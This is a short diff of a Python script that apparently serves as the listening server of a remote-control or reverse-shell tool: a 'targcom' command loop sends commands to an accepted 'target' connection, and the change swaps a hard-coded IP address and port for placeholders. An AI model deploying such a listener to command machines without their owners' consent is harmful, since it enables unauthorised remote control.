@@ -134,7 +134,7 @@ def targcom():
             else:
                 print("Invalid command")
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.bind(('68.183.89.11',5555))
+sock.bind(('xx.xxx.xx.xx',xxxx)) # replace xx.xxx.xx.xx with the ip address of the server and xxxx with a suitable port number
 print("Listening for connections")
 sock.listen(5)
 target , ip=sock.accept()
